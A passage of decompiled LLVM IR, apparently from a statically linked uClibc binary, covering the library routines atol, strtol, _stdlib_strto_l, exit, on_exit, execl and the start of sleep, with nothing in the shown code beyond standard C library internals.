  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1408c = call i32 @strtol()
  ret i32 %v0_1408c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_14094 = call i32 @_stdlib_strto_l()
  ret i32 %v0_14094
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14098 = load i32, i32* @r4, align 4
  store i32 %v3_14098, i32* %stack_var_-36, align 4
  %v0_1409c = load i32, i32* @r1, align 4
  store i32 %v0_1409c, i32* %sb.global-to-local, align 4
  %v0_140a0 = load i32, i32* @r2, align 4
  store i32 %v0_140a0, i32* %r5.global-to-local, align 4
  %v0_140a4 = load i32, i32* @r3, align 4
  store i32 %v0_140a4, i32* %fp.global-to-local, align 4
  %v0_140a8 = load i32, i32* @r0, align 4
  %v2_140bc.pre = load i32, i32* @global_var_2abb8, align 4
  br label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %dec_label_pc_140b4, %entry
  %v0_140ec = phi i32 [ %v0_140a8, %entry ], [ %v1_140b0, %dec_label_pc_140b4 ]
  store i32 %v0_140ec, i32* %r4.global-to-local, align 4
  %v1_140b8 = inttoptr i32 %v0_140ec to i8*
  %v2_140b8 = load i8, i8* %v1_140b8, align 1
  %v3_140b8 = zext i8 %v2_140b8 to i32
  %v3_140c0 = mul nuw nsw i32 %v3_140b8, 2
  %v4_140c0 = add i32 %v3_140c0, %v2_140bc.pre
  %v5_140c0 = inttoptr i32 %v4_140c0 to i8*
  %v6_140c0 = load i8, i8* %v5_140c0, align 1
  %v1_140c4 = and i8 %v6_140c0, 32
  %v2_140c4 = icmp eq i8 %v1_140c4, 0
  %v1_140b0 = add i32 %v0_140ec, 1
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_140b4

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140b4
  %v7_140cc = icmp eq i8 %v2_140b8, 43
  br i1 %v7_140cc, label %dec_label_pc_140ec, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140cc
  %v7_140d4 = icmp eq i8 %v2_140b8, 45
  br i1 %v7_140d4, label %dec_label_pc_140ec, label %bb

bb:                                               ; preds = %dec_label_pc_140d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140cc, %dec_label_pc_140d4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_140d4 ], [ 0, %dec_label_pc_140cc ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_140b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140f0:                               ; preds = %bb, %dec_label_pc_140ec
  %v0_14110 = phi i32 [ %v0_140ec, %bb ], [ %v1_140b0, %dec_label_pc_140ec ]
  %v1_140f0 = and i32 %v0_140a0, -17
  %v3_140f0 = icmp eq i32 %v1_140f0, 0
  br i1 %v3_140f0, label %dec_label_pc_140fc, label %bb54

bb54:                                             ; preds = %dec_label_pc_140f0
  br label %bb58

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140f0
  %v1_140fc = inttoptr i32 %v0_14110 to i8*
  %v2_140fc = load i8, i8* %v1_140fc, align 1
  %v7_14100 = icmp eq i8 %v2_140fc, 48
  %v1_14104 = add i32 %v0_140a0, 10
  store i32 %v1_14104, i32* %r5.global-to-local, align 4
  br i1 %v7_14100, label %dec_label_pc_14110, label %bb55

bb55:                                             ; preds = %dec_label_pc_140fc
  br label %.thread8

dec_label_pc_14110:                               ; preds = %dec_label_pc_140fc
  %v1_14110 = add i32 %v0_14110, 1
  %v2_14110 = inttoptr i32 %v1_14110 to i8*
  %v3_14110 = load i8, i8* %v2_14110, align 1
  %v4_14110 = zext i8 %v3_14110 to i32
  store i32 %v1_14110, i32* %r4.global-to-local, align 4
  %v1_14114 = or i32 %v4_14110, 32
  %v7_14118 = icmp eq i32 %v1_14114, 120
  %v1_1411c = add i32 %v0_140a0, 8
  store i32 %v1_1411c, i32* %r5.global-to-local, align 4
  br i1 %v7_14118, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_14110
  %v3_14128 = mul i32 %v1_1411c, 2
  store i32 %v3_14128, i32* %r5.global-to-local, align 4
  %v2_1412c = add i32 %v0_14110, 2
  store i32 %v2_1412c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14110, %bb55, %bb56
  %v1_141f028 = phi i32 [ %v0_140a8, %bb55 ], [ %v1_14110, %bb56 ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_1417819 = phi i32 [ %v0_14110, %bb55 ], [ %v2_1412c, %bb56 ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_14130 = phi i32 [ %v1_14104, %bb55 ], [ %v3_14128, %bb56 ], [ %v1_1411c, %dec_label_pc_14110 ]
  %v5_14134 = icmp slt i32 %v0_14130, 16
  br i1 %v5_14134, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_141f027 = phi i32 [ %v0_140a8, %bb54 ], [ %v1_141f028, %.thread8 ], [ %v1_141f028, %bb57 ]
  %v0_1417818 = phi i32 [ %v0_14110, %bb54 ], [ %v0_1417819, %.thread8 ], [ %v0_1417819, %bb57 ]
  %v0_14148 = phi i32 [ %v0_140a0, %bb54 ], [ %v0_14130, %.thread8 ], [ 16, %bb57 ]
  %v1_14138 = add i32 %v0_14148, -2
  %tmp = icmp ugt i32 %v1_14138, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_14148

.thread:                                          ; preds = %bb58
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_14148:                               ; preds = %bb58
  %v2_14150 = urem i32 -1, %v0_14148
  %v1_14160 = urem i32 %v2_14150, 256
  store i32 %v1_14160, i32* %sl.global-to-local, align 4
  %v2_14164 = udiv i32 -1, %v0_14148
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v2_14164, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14174:                               ; preds = %bb65, %dec_label_pc_141d4
  %v0_14174 = phi i32 [ %v1_141a4, %bb65 ], [ %v0_14174.pre, %dec_label_pc_141d4 ]
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14148, %dec_label_pc_14174
  %v1_141f025 = phi i32 [ %v1_141f027, %dec_label_pc_14148 ], [ %v0_14174, %dec_label_pc_14174 ]
  %v0_141a4 = phi i32 [ %v0_1417818, %dec_label_pc_14148 ], [ %v0_14174, %dec_label_pc_14174 ]
  %v1_14178 = inttoptr i32 %v0_141a4 to i8*
  %v2_14178 = load i8, i8* %v1_14178, align 1
  %v3_14178 = zext i8 %v2_14178 to i32
  %v1_1417c = add nsw i32 %v3_14178, -48
  %v1_14180 = urem i32 %v1_1417c, 256
  %v1_14188 = or i32 %v3_14178, 32
  %tmp73 = icmp ult i32 %v1_14180, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14178
  %tmp74 = icmp ugt i32 %v1_14188, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_14190
  %v1_14194 = add nsw i32 %v1_14188, -87
  %v5_1419c = urem i32 %v1_14194, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_14178, %dec_label_pc_14190, %bb59
  %v3_141cc = phi i32 [ %v1_14180, %dec_label_pc_14178 ], [ 40, %dec_label_pc_14190 ], [ %v5_1419c, %bb59 ]
  %v1_141a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_141a4 = add i32 %v0_141a4, 1
  store i32 %v1_141a4, i32* %r4.global-to-local, align 4
  %v6_141a8 = icmp slt i32 %v3_141cc, %v1_141a0
  br i1 %v6_141a8, label %dec_label_pc_141ac, label %dec_label_pc_141ec.loopexit

dec_label_pc_141ac:                               ; preds = %bb60
  %v0_141ac = load i32, i32* %ip.global-to-local, align 4
  %v1_141ac = load i32, i32* %r8.global-to-local, align 4
  %v9_141ac = icmp eq i32 %v0_141ac, %v1_141ac
  br i1 %v9_141ac, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_141ac
  br label %dec_label_pc_141bc

bb61:                                             ; preds = %dec_label_pc_141ac
  %v3_141ac = icmp ult i32 %v0_141ac, %v1_141ac
  br i1 %v3_141ac, label %dec_label_pc_141bc, label %dec_label_pc_141d4

dec_label_pc_141bc:                               ; preds = %bb61, %.thread37
  %v4_141c42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_141bc = load i32, i32* %sl.global-to-local, align 4
  %v3_141bc = icmp uge i32 %v3_141cc, %v1_141bc
  %v9_141bc = icmp eq i32 %v3_141cc, %v1_141bc
  %v2_141c0 = xor i1 %v3_141bc, true
  %v3_141c0 = or i1 %v9_141bc, %v2_141c0
  br i1 %v3_141c0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_141bc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_141bc, %bb62
  %v4_141c4 = phi i32 [ %v4_141c42240, %dec_label_pc_141bc ], [ 0, %bb62 ]
  %v2_141c4 = xor i1 %v9_141bc, true
  %v3_141c4 = and i1 %v3_141bc, %v2_141c4
  br i1 %v3_141c4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_141c4 = urem i32 %v4_141c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_141c8 = phi i32 [ %v5_141c4, %bb64 ], [ %v4_141c4, %bb63 ]
  %v2_141c8 = icmp eq i32 %v0_141c8, 0
  br i1 %v2_141c8, label %bb65, label %dec_label_pc_141d4

bb65:                                             ; preds = %thread-pre-split
  %v4_141cc = mul i32 %v0_141ac, %v1_141a0
  %v5_141cc = add i32 %v4_141cc, %v3_141cc
  store i32 %v5_141cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141d4:                               ; preds = %bb61, %thread-pre-split
  %v0_141d4 = call i32 @__errno_location()
  %v0_141d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_141d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_141d8 = and i32 %v1_141d8, %v0_141d8
  store i32 %v2_141d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_141e4 = inttoptr i32 %v0_141d4 to i32*
  store i32 34, i32* %v2_141e4, align 4
  %v0_14174.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141ec.loopexit:                      ; preds = %bb60
  %v0_141ec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %.thread, %dec_label_pc_141ec.loopexit
  %v1_141f0 = phi i32 [ %v1_141f025, %dec_label_pc_141ec.loopexit ], [ %v1_141f027, %.thread ]
  %v2_141f0 = phi i32 [ %v0_141ec.pre, %dec_label_pc_141ec.loopexit ], [ %v0_1409c, %.thread ]
  %v2_141ec = icmp eq i32 %v2_141f0, 0
  br i1 %v2_141ec, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_141ec
  %v3_141f0 = inttoptr i32 %v2_141f0 to i32*
  store i32 %v1_141f0, i32* %v3_141f0, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_141ec, %bb66
  %v0_141f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_141f4 = icmp eq i32 %v0_141f4, 0
  %. = select i1 %v2_141f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_14200 = load i32, i32* %fp.global-to-local, align 4
  %v2_14200 = icmp eq i32 %v0_14200, 0
  %v0_14224.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_14200, label %dec_label_pc_1421c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_14224.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1420c, label %dec_label_pc_1421c

dec_label_pc_1420c:                               ; preds = %bb70
  %v0_1420c = call i32 @__errno_location()
  %v2_14214 = inttoptr i32 %v0_1420c to i32*
  store i32 34, i32* %v2_14214, align 4
  %v0_14218 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14218, i32* %ip.global-to-local, align 4
  %v0_1421c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %bb70, %bb67, %dec_label_pc_1420c
  %v0_14224.pre = phi i32 [ %v0_14224.pre.pre, %bb70 ], [ %v0_14218, %dec_label_pc_1420c ], [ %v0_14224.pre.pre, %bb67 ]
  %v0_1421c = phi i32 [ %v0_141f4, %bb70 ], [ %v0_1421c.pre, %dec_label_pc_1420c ], [ %v0_141f4, %bb67 ]
  %v2_1421c = icmp eq i32 %v0_1421c, 0
  br i1 %v2_1421c, label %dec_label_pc_1421c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1421c
  %v2_14220 = sub i32 0, %v0_14224.pre
  store i32 %v2_14220, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1421c._crit_edge

dec_label_pc_1421c._crit_edge:                    ; preds = %dec_label_pc_1421c, %bb71
  %v0_14224 = phi i32 [ %v2_14220, %bb71 ], [ %v0_14224.pre, %dec_label_pc_1421c ]
  %v2_14228 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14228, i32* @r4, align 4
  ret i32 %v0_14224

; uselistorder directives
  uselistorder i32 %v0_14224.pre, { 1, 0 }
  uselistorder i32 %v0_14224.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_141c4, { 1, 0 }
  uselistorder i1 %v3_141bc, { 1, 0 }
  uselistorder i32 %v1_141bc, { 1, 0 }
  uselistorder i32 %v1_141a4, { 1, 0 }
  uselistorder i32 %v1_14188, { 1, 0 }
  uselistorder i32 %v1_14180, { 1, 0 }
  uselistorder i32 %v0_14174, { 1, 0 }
  uselistorder i32 %v0_14148, { 1, 0, 2 }
  uselistorder i32 %v3_14128, { 1, 0 }
  uselistorder i32 %v1_1411c, { 1, 0, 2 }
  uselistorder i32 %v0_14110, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_140b0, { 1, 0, 2 }
  uselistorder i32 %v0_140a8, { 1, 0, 2 }
  uselistorder i32 %v0_140a0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 -2147483648, { 0, 7, 8, 9, 10, 4, 1, 5, 6, 2, 3 }
  uselistorder label %dec_label_pc_1421c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_141ec, { 1, 0 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140f0, { 1, 0 }
  uselistorder label %dec_label_pc_140ec, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14230 = ptrtoint i32* %stack_var_-16 to i32
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2ab98.756 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_14230, i32* @r0, align 4
  %v1_1424c = call i32 @__pthread_cleanup_push_defer()
  %v2_1425c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2ab98.756 to i32))
  %v2_14264 = load i32, i32* @global_var_2f3d8.760, align 4
  %v2_14268 = icmp eq i32 %v2_14264, 0
  br i1 %v2_14268, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_14264)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_14230, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 82572, i32* @lr, align 4
  %v1_14288 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_14288, i32* @r0, align 4
  %v1_1428c = call i32 @__GI___uClibc_fini(i32 %v1_14288)
  store i32 82592, i32* @lr, align 4
  %v2_1429c = call i32 @_stdio_term()
  %v0_142a0 = load i32, i32* @r4, align 4
  %v1_142a4 = call i32 @__GI__exit(i32 %v0_142a0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 4, 6, 0, 5, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_142d0 = call i32 @__new_exitfn()
  %v2_142d4 = icmp eq i32 %v0_142d0, 0
  %. = select i1 %v2_142d4, i32 -1, i32 2
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %v2_142d4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_142e0 = inttoptr i32 %v0_142d0 to i32*
  store i32 %., i32* %v3_142e0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_142e8 = load i32, i32* @r4, align 4
  %v3_142e8 = add i32 %v0_142d0, 4
  %v4_142e8 = inttoptr i32 %v3_142e8 to i32*
  store i32 %v1_142e8, i32* %v4_142e8, align 4
  %v1_142ec = load i32, i32* @r5, align 4
  %v3_142ec = add i32 %v0_142d0, 8
  %v4_142ec = inttoptr i32 %v3_142ec to i32*
  store i32 %v1_142ec, i32* %v4_142ec, align 4
  %v0_142f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v0_142f0 = phi i32 [ -1, %entry ], [ %v0_142f0.pre, %bb ]
  ret i32 %v0_142f0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_142f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_142f8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_14308 = ptrtoint i32* %stack_var_-32 to i32
  %v2_1430c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1430c, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14318, %entry
  %v0_1432c = phi i32 [ %v1_1432c, %dec_label_pc_14318 ], [ 0, %entry ]
  %v3_14318 = phi i32 [ %v1_14320, %dec_label_pc_14318 ], [ %v2_1430c, %entry ]
  %v1_1431c = inttoptr i32 %v3_14318 to i32*
  %v2_1431c = load i32, i32* %v1_1431c, align 4
  %v1_14320 = add i32 %v3_14318, 4
  %v2_14324 = icmp eq i32 %v2_1431c, 0
  store i32 %v1_14320, i32* %stack_var_-32, align 4
  %v1_1432c = add i32 %v0_1432c, 1
  store i32 %v1_1432c, i32* %lr.global-to-local, align 4
  br i1 %v2_14324, label %dec_label_pc_14334, label %dec_label_pc_14318

dec_label_pc_14334:                               ; preds = %dec_label_pc_14318
  %v3_14334.neg = mul i32 %v1_1432c, -4
  %v1_14338.neg = add i32 %v2_14308, -8
  %v2_1433c = add i32 %v1_14338.neg, %v3_14334.neg
  %v2_14344 = inttoptr i32 %v2_1433c to i32*
  store i32 %arg1, i32* %v2_14344, align 4
  store i32 %v2_1430c, i32* %stack_var_-32, align 4
  %v0_14350 = load i32, i32* @sp, align 4
  store i32 %v0_14350, i32* @r1, align 4
  store i32 %v0_14350, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14358

dec_label_pc_14358:                               ; preds = %dec_label_pc_14358.dec_label_pc_14358_crit_edge, %dec_label_pc_14334
  %v1_1436c = phi i32 [ %v5_1436c, %dec_label_pc_14358.dec_label_pc_14358_crit_edge ], [ %v0_14350, %dec_label_pc_14334 ]
  %v3_14358 = phi i32 [ %v3_14358.pre, %dec_label_pc_14358.dec_label_pc_14358_crit_edge ], [ %v2_1430c, %dec_label_pc_14334 ]
  %v1_1435c = inttoptr i32 %v3_14358 to i32*
  %v2_1435c = load i32, i32* %v1_1435c, align 4
  %v0_14360 = load i32, i32* %lr.global-to-local, align 4
  %v1_14360 = add i32 %v0_14360, -1
  store i32 %v1_14360, i32* %lr.global-to-local, align 4
  %v7_14360 = icmp eq i32 %v0_14360, 1
  %v1_14364 = add i32 %v3_14358, 4
  store i32 %v1_14364, i32* %stack_var_-32, align 4
  %v2_1436c = add i32 %v1_1436c, 4
  %v3_1436c = inttoptr i32 %v2_1436c to i32*
  store i32 %v2_1435c, i32* %v3_1436c, align 4
  %v4_1436c = load i32, i32* %ip.global-to-local, align 4
  %v5_1436c = add i32 %v4_1436c, 4
  store i32 %v5_1436c, i32* %ip.global-to-local, align 4
  br i1 %v7_14360, label %dec_label_pc_14374, label %dec_label_pc_14358.dec_label_pc_14358_crit_edge

dec_label_pc_14358.dec_label_pc_14358_crit_edge:  ; preds = %dec_label_pc_14358
  %v3_14358.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_14358

dec_label_pc_14374:                               ; preds = %dec_label_pc_14358
  %v2_14378 = load i32, i32* @global_var_2f3e4.765, align 4
  store i32 %v2_14378, i32* @r2, align 4
  %v0_1437c = call i32 @__GI_execve()
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32 %v5_1436c, { 1, 0 }
  uselistorder i32 %v0_14360, { 1, 0 }
  uselistorder i32 %v1_1432c, { 0, 2, 1 }
  uselistorder i32 %v1_14320, { 1, 0 }
  uselistorder i32 %v3_14318, { 1, 0 }
  uselistorder i32 %v2_1430c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1438c = load i32, i32* @r4, align 4
  store i32 %v3_1438c, i32* %stack_var_-20, align 4
  %v6_1438c = load i32, i32* @r5, align 4
  %v9_1438c = load i32, i32* @r6, align 4
  %v16_1438c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_14390 = icmp eq i32 %arg1, 0
  %v2_14394 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_14390, label %dec_label_pc_14518, label %dec_label_pc_143ac.preheader

dec_label_pc_143ac.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_143b417 = add i32 %v16_1438c, 124
  br label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %dec_label_pc_143ac.preheader, %dec_label_pc_143a4
  %v5_143b418 = phi i32 [ %v5_143b417, %dec_label_pc_143ac.preheader ], [ %v5_143b4, %dec_label_pc_143a4 ]
  %v2_143a8 = add i32 %v5_143b418, -136
  %v3_143a8 = inttoptr i32 %v2_143a8 to i32*
  store i32 0, i32* %v3_143a8, align 4
  %v0_143ac.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_143ac = add i32 %v0_143ac.pre, -1
  store i32 %v1_143ac, i32* %r1.global-to-local, align 4
  %v6_143ac = icmp slt i32 %v1_143ac, 0
  %v4_143b4 = mul i32 %v1_143ac, 4
  %v5_143b4 = add i32 %v4_143b4, %v16_1438c
  br i1 %v6_143ac, label %dec_label_pc_143bc, label %dec_label_pc_143a4

dec_label_pc_143bc:                               ; preds = %dec_label_pc_143a4
  %v2_143bc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_143bc, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_143bc, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_143cc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_143cc, i32* %stack_var_-28, align 4
  %v0_143d4 = call i32 @__sigaddset()
  store i32 %v0_143d4, i32* %r0.global-to-local, align 4
  %v1_143d8 = load i32, i32* @r5, align 4
  %v5_143dc = icmp slt i32 %v0_143d4, %v1_143d8
  br i1 %v5_143dc, label %dec_label_pc_14520, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143bc
  %v2_143e0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_143e0, i32* @r4, align 4
  store i32 %v1_143d8, i32* %r0.global-to-local, align 4
  store i32 %v2_143bc, i32* %r1.global-to-local, align 4
  %v3_143f0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_143f0 = call i32 @__GI_sigprocmask(i32 %v1_143d8, %_TYPEDEF_sigset_t* %v3_143f0, i32 %v2_143e0)
  store i32 %v4_143f0, i32* %r0.global-to-local, align 4
  %v1_143f4 = load i32, i32* @r5, align 4
  %v9_143f4 = icmp eq i32 %v4_143f0, %v1_143f4
  br i1 %v9_143f4, label %dec_label_pc_143fc, label %dec_label_pc_14520

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143e0
  store i32 17, i32* @r1, align 4
  store i32 %v2_143e0, i32* @r0, align 4
  %v0_14404 = call i32 @__sigismember()
  store i32 %v0_14404, i32* %r0.global-to-local, align 4
  %v1_14408 = load i32, i32* @r5, align 4
  %v9_14408 = icmp eq i32 %v0_14404, %v1_14408
  br i1 %v9_14408, label %dec_label_pc_14420.preheader, label %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge

dec_label_pc_143fc.dec_label_pc_144e8_crit_edge:  ; preds = %dec_label_pc_143fc
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_144e8

dec_label_pc_14420.preheader:                     ; preds = %dec_label_pc_143fc
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_14420.preheader, %dec_label_pc_14418
  %v5_1442816 = phi i32 [ %v5_143b417, %dec_label_pc_14420.preheader ], [ %v5_14428, %dec_label_pc_14418 ]
  %v2_1441c = add i32 %v5_1442816, -136
  %v3_1441c = inttoptr i32 %v2_1441c to i32*
  store i32 0, i32* %v3_1441c, align 4
  %v0_14420.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14420 = add i32 %v0_14420.pre, -1
  store i32 %v1_14420, i32* %r1.global-to-local, align 4
  %v6_14420 = icmp slt i32 %v1_14420, 0
  %v4_14428 = mul i32 %v1_14420, 4
  %v5_14428 = add i32 %v4_14428, %v16_1438c
  br i1 %v6_14420, label %dec_label_pc_14430, label %dec_label_pc_14418

dec_label_pc_14430:                               ; preds = %dec_label_pc_14418
  store i32 %v2_143bc, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14438 = call i32 @__sigaddset()
  store i32 %v0_14438, i32* %r0.global-to-local, align 4
  %v1_1443c = icmp slt i32 %v0_14438, 0
  br i1 %v1_1443c, label %dec_label_pc_14520, label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14430
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_14450 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_14394)
  store i32 %v4_14450, i32* %r0.global-to-local, align 4
  %v1_14454 = icmp slt i32 %v4_14450, 0
  br i1 %v1_14454, label %dec_label_pc_1445c, label %dec_label_pc_14484

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14444
  %v0_1445c = call i32 @__errno_location()
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 %v0_1445c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14470 = inttoptr i32 %v0_1445c to i32*
  %v2_14470 = load i32, i32* %v1_14470, align 4
  store i32 %v2_14470, i32* @r4, align 4
